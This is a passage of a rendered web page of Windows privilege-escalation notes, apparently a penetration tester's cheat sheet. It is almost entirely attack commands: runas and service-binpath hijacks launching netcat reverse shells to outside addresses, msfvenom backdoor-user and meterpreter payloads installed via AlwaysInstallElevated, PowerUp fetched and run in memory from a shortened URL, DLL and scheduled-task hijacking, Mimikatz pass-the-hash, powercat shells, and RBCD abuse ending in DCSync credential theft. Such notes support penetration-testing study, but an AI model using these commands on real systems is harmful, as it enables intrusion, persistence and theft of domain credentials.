dir /s *pass* <span style="color:#f92672">==</span> *cred* <span style="color:#f92672">==</span> *vnc* <span style="color:#f92672">==</span> *.config*

<span style="color:#75715e"># Interesting files</span>
C:<span style="color:#8045ff">\u</span>nattend.xml
C:<span style="color:#8045ff">\s</span>ysprep.inf
C:<span style="color:#8045ff">\s</span>ysprep<span style="color:#8045ff">\s</span>ysprep.xml</code></pre></div>
<p><br/></p>

<h3 id="run-as">Run As</h3>
<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># If application is running as admin and credentials saved in there you can abuse it by modifying its properties that way:</span>
C:<span style="color:#8045ff">\W</span>INDOWS<span style="color:#8045ff">\s</span>ystem32<span style="color:#8045ff">\r</span>unas.exe /user:administrator /savecreds <span style="color:#d88200">&#34;C:\Documents and Settings\username\Desktop\nc.exe -nc 10.11.0.179 41337 -e C:\Windows\System32\cmd.exe&#34;</span>

<span style="color:#75715e"># If you want to run a simple runas.exe:</span>
C:<span style="color:#8045ff">\W</span>INDOWS<span style="color:#8045ff">\s</span>ystem32<span style="color:#8045ff">\r</span>unas.exe /user:administrator /password:pass <span style="color:#d88200">&#34;C:\Documents and Settings\username\Desktop\nc.exe -nc 10.11.0.179 41337 -e C:\Windows\System32\cmd.exe&#34;</span></code></pre></div>
<p><br/></p>

<h3 id="kerberoast">Kerberoast</h3>
<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">powershell.exe -ExecutionPolicy Bypass -NoLogo <span style="color:#d88200">&#34;setspn -T medin -Q */*&#34;</span>
powershell.exe -ExecutionPolicy Bypass -NoLogo <span style="color:#d88200">&#34;Add-Type -AssemblyName System.IdentityModel&#34;</span>
powershell.exe -ExecutionPolicy Bypass -NoLogo <span style="color:#d88200">&#39;New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &#34;HTTP/web01.medin.local&#34;&#39;</span> klist</code></pre></div>
<p><br/></p>

<h3 id="alwaysinstallelevated">AlwaysInstallElevated</h3>
<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># It&#39;s a setting allowing unprivileged users to run Windows Installer Packages Files (MSI) with elevated permissions (SYSTEM)</span>

<span style="color:#75715e"># Check the value of this registry</span>
reg query HKLM<span style="color:#8045ff">\S</span>OFTWARE<span style="color:#8045ff">\P</span>olicies<span style="color:#8045ff">\M</span>icrosoft<span style="color:#8045ff">\W</span>indows<span style="color:#8045ff">\I</span>nstaller /v AlwaysInstallElevated
reg query HKCU<span style="color:#8045ff">\S</span>OFTWARE<span style="color:#8045ff">\P</span>olicies<span style="color:#8045ff">\M</span>icrosoft<span style="color:#8045ff">\W</span>indows<span style="color:#8045ff">\I</span>nstaller /v AlwaysInstallElevated

<span style="color:#75715e"># If set to 1, you can create your own MSI (or msi-nouac)</span>
<span style="color:#75715e"># Add user</span>
msfvenom -p windows/adduser <span style="color:#111">USER</span><span style="color:#f92672">=</span>backdoor <span style="color:#111">PASS</span><span style="color:#f92672">=</span>backdoor123 -f msi -o evil.msi

<span style="color:#75715e"># Or reverse shell</span>
msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai <span style="color:#111">LHOST</span><span style="color:#f92672">=</span><span style="color:#ae81ff">192</span>.168.2.60 <span style="color:#111">LPORT</span><span style="color:#f92672">=</span><span style="color:#ae81ff">8989</span> -f exe -o Payload.exe
msfvenom -f msi-nouac -p windows/exec <span style="color:#111">cmd</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;C:\Users\testuser\AppData\Local\Temp\Payload.exe&#34;</span> &gt; malicious.msi


<span style="color:#75715e"># You can then use msiexec to execute the payload</span>
<span style="color:#75715e"># /quiet = no msg to user, /qn = no GUI, /i = regular install (no admin)</span>
msiexec /quiet /qn /i C:<span style="color:#8045ff">\e</span>vil.msi

<span style="color:#75715e"># MSF module</span>
exploit/windows/local/always_install_elevated</code></pre></div>
<p><br/></p>

<h3 id="powersploit-powerup">PowerSploit / PowerUp</h3>
<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Copy PowerUp.ps1 to Powershell bypass Execution policy</span>
powershell -exec bypass
Import-Module .<span style="color:#8045ff">\P</span>owerUp.ps1
Invoke-AllChecks

<span style="color:#75715e"># You can also use SharUp.exe</span>
<span style="color:#75715e"># Need to be compiled, but newer tool.</span></code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf shell&gt; powershell.exe -exec bypass -Command “<span style="color:#111">&amp;</span> <span style="color:#f92672">{</span>Import-Module .<span style="color:#8045ff">\P</span>owerUp.ps1<span style="color:#111">;</span> Invoke-AllChecks<span style="color:#f92672">}</span>”</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">C:&gt; powershell.exe -nop -exec bypass
PS C:<span style="color:#8045ff">\&gt;</span> Import-Module PowerUp.ps1
PS C:<span style="color:#8045ff">\&gt;</span> Invoke-AllChecks <span style="color:#111">|</span> Out-File -Encoding ASCII checks.txt

<span style="color:#75715e"># Full in memory</span>
C:<span style="color:#8045ff">\&gt;</span> powershell -nop -exec bypass -c “IEX <span style="color:#f92672">(</span>New-Object Net.WebClient<span style="color:#f92672">)</span>.DownloadString<span style="color:#f92672">(</span>‘http://bit.ly/1mK64oH’<span style="color:#f92672">)</span><span style="color:#111">;</span> Invoke-AllChecks”</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># If a binary seems to be exploitable you can backup real service and create a backdored one</span>
PS C:<span style="color:#8045ff">\&gt;</span> Write-ServiceEXE -ServiceName CustomSVC -UserName backdoor -Password password123 -Verbose

<span style="color:#75715e"># Restore the real service</span>
PS C:<span style="color:#8045ff">\&gt;</span> Restore-ServiceEXE -ServiceName CustomSVC</code></pre></div>
<p><br/></p>

<h3 id="services-and-scheduled-tasks">Services and Scheduled Tasks</h3>
<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Query one service</span>
sc qc Spooler

<span style="color:#75715e"># Check permissions</span>
accesschk.exe -ucqv Spooler

C:<span style="color:#8045ff">\&gt;</span> accesschk.exe -uwcqv <span style="color:#d88200">&#34;Authenticated Users&#34;</span> *
RW SSDPSRV
        SERVICE_ALL_ACCESS
RW upnphost
        SERVICE_ALL_ACCESS

accesschk.exe -ucqv SSDPSRV
accesschk.exe -ucqv upnphost

<span style="color:#75715e"># Search for specific service (looking for write permissions)</span>
sc qc upnphost

<span style="color:#75715e"># Following rights can give a SYSTEM shell</span>
SERVICE_CHANGE_CONFIG <span style="color:#f92672">(</span>Can reconfigure the service binary<span style="color:#f92672">)</span>
WRITE_DAC <span style="color:#f92672">(</span>Can reconfigure permissions, leading to <span style="color:#ae81ff">1</span><span style="color:#f92672">)</span>
WRITE_OWNER <span style="color:#f92672">(</span>Can become owner and reconfigure permissions<span style="color:#f92672">)</span>
GENERIC_WRITE <span style="color:#f92672">(</span>Inherits SERVICE_CHANGE_CONFIG<span style="color:#f92672">)</span>
GENERIC_ALL <span style="color:#f92672">(</span>Inherits SERVICE_CHANGE_CONFIG<span style="color:#f92672">)</span>

<span style="color:#75715e"># Exploit a vulnerable service (or adding new user)</span>
sc config upnphost <span style="color:#111">binpath</span><span style="color:#f92672">=</span> <span style="color:#d88200">&#34;C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe&#34;</span>
sc config upnphost <span style="color:#111">obj</span><span style="color:#f92672">=</span> <span style="color:#d88200">&#34;.\LocalSystem&#34;</span> <span style="color:#111">password</span><span style="color:#f92672">=</span> <span style="color:#d88200">&#34;&#34;</span>
sc qc upnphost
net start upnphost

<span style="color:#75715e"># You can use subinacl.exe to check vulnerable service permissions</span>
subinacl.exe /keyreg <span style="color:#d88200">&#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service&#34;</span> /display

<span style="color:#75715e"># If you have full control over a registry key, you can override it</span>
msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai <span style="color:#111">LHOST</span><span style="color:#f92672">=</span><span style="color:#ae81ff">192</span>.168.2.60 <span style="color:#111">LPORT</span><span style="color:#f92672">=</span><span style="color:#ae81ff">8989</span> -f exe -o Payload.exe
reg add <span style="color:#d88200">&#34;HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Vulnerable Service&#34;</span> /t REG_EXPAND_SZ /v ImagePath /d <span style="color:#d88200">&#34;C:\Users\testuser\AppData\Local\Temp\Payload.exe&#34;</span> /f
shutdown /r /t <span style="color:#ae81ff">0</span>

<span style="color:#75715e"># MSF module</span>
exploit/windows/local/service_permissions

<span style="color:#75715e"># Exploiting service with write permissions</span>
<span style="color:#75715e"># You want to have (F) or (C) rights</span>
C:<span style="color:#8045ff">\p</span>ath<span style="color:#8045ff">\t</span>o<span style="color:#8045ff">\f</span>ile.exe 
BUILTIN<span style="color:#8045ff">\U</span>sers:F
BUILTIN<span style="color:#8045ff">\P</span>ower Users:C 
BUILTIN<span style="color:#8045ff">\A</span>dministrators:F 
NT AUTHORITY<span style="color:#8045ff">\S</span>YSTEM:F

<span style="color:#75715e"># Then you can add your own binary</span>
<span style="color:#75715e">#include &lt;stdlib.h&gt;</span>
int main <span style="color:#f92672">()</span>
<span style="color:#f92672">{</span>
int i<span style="color:#111">;</span>
    <span style="color:#111">i</span> <span style="color:#f92672">=</span> system<span style="color:#f92672">(</span><span style="color:#d88200">&#34;net localgroup administrators theusername /add&#34;</span><span style="color:#f92672">)</span><span style="color:#111">;</span>
<span style="color:#00a8c8">return</span> <span style="color:#ae81ff">0</span><span style="color:#111">;</span>
<span style="color:#f92672">}</span>

<span style="color:#75715e"># Compile it</span>
i686-w64-mingw32-gcc windows-exp.c -lws2_32 -o exp.exe

<span style="color:#75715e"># And restart the service</span>
wmic service NAMEOFSERVICE call startservice
net stop <span style="color:#f92672">[</span>service name<span style="color:#f92672">]</span> <span style="color:#f92672">&amp;&amp;</span> net start <span style="color:#f92672">[</span>service name<span style="color:#f92672">]</span></code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#111">echo</span> %path%

<span style="color:#75715e"># Check permissions for a service in PAth</span>
accesschk.exe -dqv <span style="color:#d88200">&#34;C:\Python27&#34;</span>
cacls <span style="color:#d88200">&#34;C:\Python27&#34;</span>

<span style="color:#75715e"># Need to check the IKEEXT service</span>
sc qc IKEEXT

<span style="color:#75715e"># If all conditions are met, you can craft a shell</span>
msfpayload windows/shell_reverse_tcp <span style="color:#111">lhost</span><span style="color:#f92672">=</span><span style="color:#d88200">&#39;127.0.0.1&#39;</span> <span style="color:#111">lport</span><span style="color:#f92672">=</span><span style="color:#d88200">&#39;9988&#39;</span> O
msfpayload windows/shell_reverse_tcp <span style="color:#111">lhost</span><span style="color:#f92672">=</span><span style="color:#d88200">&#39;127.0.0.1&#39;</span> <span style="color:#111">lport</span><span style="color:#f92672">=</span><span style="color:#d88200">&#39;9988&#39;</span> D &gt; 
/root/Desktop/evil.dll

<span style="color:#75715e"># Then upload it and rename it</span>
copy evil.dll C:<span style="color:#8045ff">\P</span>ython27<span style="color:#8045ff">\w</span>lbsctrl.dll
dir C:<span style="color:#8045ff">\P</span>ython27

<span style="color:#75715e"># Then system reboot</span>

<span style="color:#75715e"># DLL Hijacking other methods</span>
msf&gt; search -f Vulnerable.exe
msf&gt; download Vulnerable.exe

<span style="color:#75715e"># You can use procmon to check missing DLL (add Process Name, Result, Name)</span>
<span style="color:#75715e"># Then</span> 
msf&gt; search -f hijackable.dll</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Scheduled Tasks</span>
<span style="color:#75715e"># For example, a TFTP server</span>
Task To Run: E:<span style="color:#8045ff">\G</span>rabLogs<span style="color:#8045ff">\t</span>ftp.exe <span style="color:#ae81ff">10</span>.1.1.99 GET log.out E:<span style="color:#8045ff">\G</span>rabLogs<span style="color:#8045ff">\L</span>ogs<span style="color:#8045ff">\l</span>og.txt

<span style="color:#75715e"># Check rights for the folder</span>
accesschk.exe -dqv <span style="color:#d88200">&#34;E:\GrabLogs&#34;</span>
dir <span style="color:#d88200">&#34;E:\GrabLogs&#34;</span>

<span style="color:#75715e"># If running as SYSTEM and write permissions for users, you can craft a payload</span>
msfpayload windows/shell_reverse_tcp <span style="color:#111">lhost</span><span style="color:#f92672">=</span><span style="color:#d88200">&#39;127.0.0.1&#39;</span> <span style="color:#111">lport</span><span style="color:#f92672">=</span><span style="color:#d88200">&#39;9988&#39;</span> O
msfpayload windows/shell_reverse_tcp <span style="color:#111">lhost</span><span style="color:#f92672">=</span><span style="color:#d88200">&#39;127.0.0.1&#39;</span> <span style="color:#111">lport</span><span style="color:#f92672">=</span><span style="color:#d88200">&#39;9988&#39;</span> R <span style="color:#111">|</span> msfencode -t
exe &gt; /root/Desktop/evil-tftp.exe

<span style="color:#75715e"># Then copy payload</span>
copy evil-tftp.exe E:<span style="color:#8045ff">\G</span>rabLogs<span style="color:#8045ff">\t</span>ftp.exe</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># When executing any of the sysinternals tools for the first time the user will be presented with a GUI</span>
<span style="color:#75715e"># pop-up to accept the EULA. This is obviously a big problem, however we can add an extra command line flag</span>
<span style="color:#75715e"># to automatically accept the EULA.</span>
accesschk.exe /accepteula ... ... ...

<span style="color:#75715e"># Find all weak folder permissions per drive.</span>
accesschk.exe -uwdqs Users c:<span style="color:#8045ff">\
</span><span style="color:#8045ff"></span>accesschk.exe -uwdqs <span style="color:#d88200">&#34;Authenticated Users&#34;</span> c:<span style="color:#8045ff">\
</span><span style="color:#8045ff"></span>
<span style="color:#75715e"># Find all weak file permissions per drive.</span>
accesschk.exe -uwqs Users c:<span style="color:#8045ff">\*</span>.*
accesschk.exe -uwqs <span style="color:#d88200">&#34;Authenticated Users&#34;</span> c:<span style="color:#8045ff">\*</span>.*</code></pre></div>
<p><br/></p>

<h3 id="pass-the-hash-using-machine-accounts">Pass the Hash using Machine Accounts</h3>
<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Need to be local admin on the target machine</span>

<span style="color:#75715e"># Finding domain computers that are members of interesting groups</span>
Get-ADComputer -Filter * -Properties MemberOf <span style="color:#111">|</span> ? <span style="color:#f92672">{</span><span style="color:#111">$_</span>.MemberOf<span style="color:#f92672">}</span>
net group <span style="color:#d88200">&#34;domain admins&#34;</span> /domain
net localgroup administrators /domain

<span style="color:#75715e"># After gaining local admin, hash machine extraction</span>
sekurlsa::logonPasswords

<span style="color:#75715e"># Compromised user can&#39;t access the DC</span>
dir <span style="color:#8045ff">\\</span>dc01<span style="color:#8045ff">\c</span>$

<span style="color:#75715e"># You can use Mimikatz to PtH and elevate to domain admin because WS01$ is in Domain Admins</span>
sekurlsa::pth /user:ws01$ /domain:offense.local /ntlm:ab53503b0f35c9883ff89b75527d5861</code></pre></div>
<p><br/></p>

<h3 id="get-local-privileges-back">Get Local Privileges back</h3>
<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># From https://itm4n.github.io/localservice-privileges/</span>

<span style="color:#75715e"># Create a scheduled task</span>
PS&gt; <span style="color:#111">$TaskAction</span> <span style="color:#f92672">=</span> New-ScheduledTaskAction -Execute <span style="color:#d88200">&#34;powershell.exe&#34;</span> -Argument <span style="color:#d88200">&#34;-Exec Bypass -Command `&#34;</span>. C:<span style="color:#8045ff">\T</span>OOLS<span style="color:#8045ff">\p</span>owercat.ps1<span style="color:#111">;</span> powercat -l -p <span style="color:#ae81ff">7002</span> -ep<span style="color:#d88200">`</span><span style="color:#d88200">&#34;&#34;</span>
PS&gt; Register-ScheduledTask -Action <span style="color:#111">$TaskAction</span> -TaskName <span style="color:#d88200">&#34;SomeTask&#34;</span>
PS&gt; Start-ScheduledTask -TaskName <span style="color:#d88200">&#34;SomeTask&#34;</span>

<span style="color:#75715e"># Then connect to the bind shell</span>
. .<span style="color:#8045ff">\p</span>owercat.ps1
powercat -c <span style="color:#ae81ff">127</span>.0.0.1 -p <span style="color:#ae81ff">7002</span>

---------------

<span style="color:#75715e"># In order to get the SeImpersonatePrivilege back, you need to specify it clearly</span>
<span style="color:#75715e"># Create a list of privileges</span> 
<span style="color:#f92672">[</span>System.String<span style="color:#f92672">[]]</span><span style="color:#111">$Privs</span> <span style="color:#f92672">=</span> <span style="color:#d88200">&#34;SeAssignPrimaryTokenPrivilege&#34;</span>, <span style="color:#d88200">&#34;SeAuditPrivilege&#34;</span>, <span style="color:#d88200">&#34;SeChangeNotifyPrivilege&#34;</span>, <span style="color:#d88200">&#34;SeCreateGlobalPrivilege&#34;</span>, <span style="color:#d88200">&#34;SeImpersonatePrivilege&#34;</span>, <span style="color:#d88200">&#34;SeIncreaseQuotaPrivilege&#34;</span>, <span style="color:#d88200">&#34;SeShutdownPrivilege&#34;</span>, <span style="color:#d88200">&#34;SeUndockPrivilege&#34;</span>, <span style="color:#d88200">&#34;SeIncreaseWorkingSetPrivilege&#34;</span>, <span style="color:#d88200">&#34;SeTimeZonePrivilege&#34;</span>

<span style="color:#75715e"># Create a Principal for the task</span> 
<span style="color:#111">$TaskPrincipal</span> <span style="color:#f92672">=</span> New-ScheduledTaskPrincipal -UserId <span style="color:#d88200">&#34;LOCALSERVICE&#34;</span> -LogonType ServiceAccount -RequiredPrivilege <span style="color:#111">$Privs</span>

<span style="color:#75715e"># Create an action for the task</span> 
<span style="color:#111">$TaskAction</span> <span style="color:#f92672">=</span> New-ScheduledTaskAction -Execute <span style="color:#d88200">&#34;powershell.exe&#34;</span> -Argument <span style="color:#d88200">&#34;-Exec Bypass -Command `&#34;</span>. C:<span style="color:#8045ff">\T</span>OOLS<span style="color:#8045ff">\p</span>owercat.ps1<span style="color:#111">;</span> powercat -l -p <span style="color:#ae81ff">7003</span> -ep<span style="color:#d88200">`</span><span style="color:#d88200">&#34;&#34;</span>
<span style="color:#75715e"># Create the task</span>
Register-ScheduledTask -Action <span style="color:#111">$TaskAction</span> -TaskName <span style="color:#d88200">&#34;SomeTask2&#34;</span> -Principal <span style="color:#111">$TaskPrincipal</span>
<span style="color:#75715e"># Start the task</span>
Start-ScheduledTask -TaskName <span style="color:#d88200">&#34;SomeTask2&#34;</span></code></pre></div>
<p><br/></p>

<h3 id="rbcd-exploitation">RBCD Exploitation</h3>
<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">https://github.com/aas-n/leHACK19

<span style="color:#75715e"># Importing Powerview and Powermad</span>
Import-Module .<span style="color:#8045ff">\P</span>owerview.ps1
Import-Module .<span style="color:#8045ff">\P</span>owermad.ps1

<span style="color:#75715e"># Authentication</span>
<span style="color:#111">$TargetComputer</span> <span style="color:#f92672">=</span> <span style="color:#d88200">&#34;DC01.domain.lan&#34;</span>
<span style="color:#111">$SecPassword</span> <span style="color:#f92672">=</span> ConvertTo-SecureString <span style="color:#d88200">&#39;passw0rd&#39;</span> -AsPlainText -Force
<span style="color:#111">$Cred</span> <span style="color:#f92672">=</span> New-Object System.Management.Automation.PSCredential<span style="color:#f92672">(</span><span style="color:#d88200">&#39;DOMAIN\ControlledAccount&#39;</span>, <span style="color:#111">$SecPassword</span><span style="color:#f92672">)</span>

<span style="color:#75715e"># Get our user&#39;s SID</span>
<span style="color:#111">$AttackerSID</span> <span style="color:#f92672">=</span> Get-DomainUser ControlledUser -Credential <span style="color:#111">$Cred</span> -Server <span style="color:#ae81ff">10</span>.10.10.10 -Properties objectsid <span style="color:#111">|</span> Select -Expand objectsid
<span style="color:#111">$ACE</span> <span style="color:#f92672">=</span> Get-DomainObjectACL <span style="color:#111">$TargetComputer</span> -Credential <span style="color:#111">$Cred</span> -Server <span style="color:#ae81ff">10</span>.10.10.10 <span style="color:#111">|</span> ?<span style="color:#f92672">{</span><span style="color:#111">$_</span>.SecurityIdentifier -match <span style="color:#111">$AttackerSID</span><span style="color:#f92672">}</span>

<span style="color:#75715e"># Adding a machine and getting SID</span>
New-MachineAccount -Credential <span style="color:#111">$Cred</span> -Domain domain.lan -DomainController <span style="color:#ae81ff">10</span>.10.10.10 -MachineAccount lleXXXXX -Password <span style="color:#00a8c8">$(</span>ConvertTo-SecureString <span style="color:#d88200">&#39;passw0rd&#39;</span> -AsPlainText -Force<span style="color:#00a8c8">)</span>
<span style="color:#111">$ComputerSID</span> <span style="color:#f92672">=</span> Get-DomainComputer lleXXXXX -Credential <span style="color:#111">$Cred</span> -Server <span style="color:#ae81ff">10</span>.10.10.10 -Properties objectsid <span style="color:#111">|</span> Select -Expand objectsid

<span style="color:#75715e"># Creating structure to store in Allowedtoact in the DC</span>
<span style="color:#111">$SD</span><span style="color:#f92672">=</span> New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList <span style="color:#d88200">&#34;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;</span><span style="color:#00a8c8">$(</span><span style="color:#111">$ComputerSID</span><span style="color:#00a8c8">)</span><span style="color:#d88200">)&#34;</span>
<span style="color:#111">$SDBytes</span> <span style="color:#f92672">=</span> New-Object byte<span style="color:#f92672">[]</span> <span style="color:#f92672">(</span><span style="color:#111">$SD</span>.BinaryLength<span style="color:#f92672">)</span>
<span style="color:#111">$SD</span>.GetBinaryForm<span style="color:#f92672">(</span><span style="color:#111">$SDBytes</span>, <span style="color:#ae81ff">0</span><span style="color:#f92672">)</span>

<span style="color:#75715e"># Rewrite Allowedtoact properties on the DC</span>
Get-DomainComputer <span style="color:#111">$TargetComputer</span> -Credential <span style="color:#111">$Cred</span> -Server <span style="color:#ae81ff">10</span>.10.10.10 <span style="color:#111">|</span> Set-DomainObject -Credential <span style="color:#111">$Cred</span> -Server <span style="color:#ae81ff">10</span>.10.10.10 -Set @<span style="color:#f92672">{</span><span style="color:#d88200">&#39;msds-allowedtoactonbehalfofotheridentity&#39;</span><span style="color:#f92672">=</span><span style="color:#111">$SDBytes</span><span style="color:#f92672">}</span>

<span style="color:#75715e"># Now you can impersonate the domain admin account on the DC using the machine account</span>
.<span style="color:#8045ff">\R</span>ubeus.exe <span style="color:#111">hash</span> /password:passw0rd /user:lleXXXXX /domain:domain.lan
.<span style="color:#8045ff">\R</span>ubeus.exe s4u /user:lleXXXXX$ /rc4:&lt;hash&gt; /impersonateuser:Administrator /msdsspn:ldap/DC01.domain.lan /ptt /dc:10.10.10.10 /domain:domain.lan
.<span style="color:#8045ff">\R</span>ubeus.exe klist

<span style="color:#75715e"># Then, you can get the NTLM hash of domain admin using DCSync and Mimikatz</span>
.<span style="color:#8045ff">\M</span>imikatz.exe
mimikatz&gt; lsadump::dcsync /user:domain<span style="color:#8045ff">\A</span>dminisrator /domain:domain.lan /dc:DC01.domain.lan</code></pre></div>

    
    
        <div class="chevrons">
    <div id="navigation">
<a class="nav nav-prev" href="/windows-systems/privilege-escalation/admin_processes/" title="Admin and Processes"> <i class="fa fa-chevron-left"></i><label>Admin and Processes</label></a>
    <a class="nav nav-next" href="/windows-systems/privilege-escalation/lsass_mimikatz/" title="LSASS and Mimikatz" style="margin-right: 0px;"><label>LSASS and Mimikatz</label><i class="fa fa-chevron-right"></i></a></div>
  </div>

  </section>
</article>

<footer>

<div class="footline">
    

    

    

    
    <div class="github-link">
      <a href="https://github.com/vjeantet/hugo-theme-docdock/edit/master/exampleSite/content/Windows%20Systems/Privilege%20Escalation/Tricks.md" target="blank"><i class="fa fa-code-fork"></i>
        Improve this page</a>
    </div>
    
  </div>


	<div>


  
    Create a content/_footer.md file to customize the footer content
  



	</div>
</footer>

<script src="/js/clipboard.min.js"></script>

<link href="/css/featherlight.min.css" rel="stylesheet">
<script src="/js/featherlight.min.js"></script>



<script src="/theme-flex/script.js"></script>


    

    
    

    
  </body>
</html>